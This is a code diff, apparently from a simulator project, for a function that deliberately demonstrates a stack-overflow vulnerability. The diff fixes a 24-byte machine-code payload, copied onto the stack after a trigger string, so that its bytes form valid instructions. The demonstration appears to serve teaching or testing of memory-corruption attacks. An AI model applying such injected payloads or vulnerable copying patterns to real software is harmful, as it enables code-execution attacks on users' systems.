@@ -201,37 +201,17 @@ void demo_vulnerability_by_copying_trigger_and_payload_to_stack(void) {
     sim_puts("Starting to memory load the optimization demo...\n");
 
     // Copy the demo string to the stack.
-    // strcpy_one_by_one(demo_string, "OPTIMIZ[b7020001130380051373f30fb3e262007390227b6ff0dfff]DONE");
     memcpy_one_by_one_u8(
         demo_string,
-        // "OPTIMIZ[b7020001130380051373f30fb3e262007390227b6ff0dfff]DONE"
         (uint8_t[]) {
             'O', 'P', 'T', 'I', 'M', 'I', 'Z', '[', // 8 bytes
             // Payload here (24 bytes):
-            0xb7,
-            0x70,
-            0x02,
-            0x20,
-            0x00,
-            0x00,
-            0x01,
-            0x11,
-            0x13,
-            0x30,
-            0x03,
-            0x38,
-            0x80,
-            0x00,
-            0x05,
-            0x51,
-            0x13,
-            0x37,
-            0x73,
-            0x3f,
-            0xf3,
-            0x30,
-            0x0f,
-            0xfb,
+            0xb7, 0x02, 0x00, 0x01,
+            0x13, 0x03, 0x80, 0x05,
+            0x13, 0x73, 0xf3, 0x0f,
+            0xb3, 0xe2, 0x62, 0x00,
+            0x73, 0x90, 0x22, 0x7b,
+            0x6f, 0xf0, 0xdf, 0xff,
             // End of payload
             ']',
             'a',
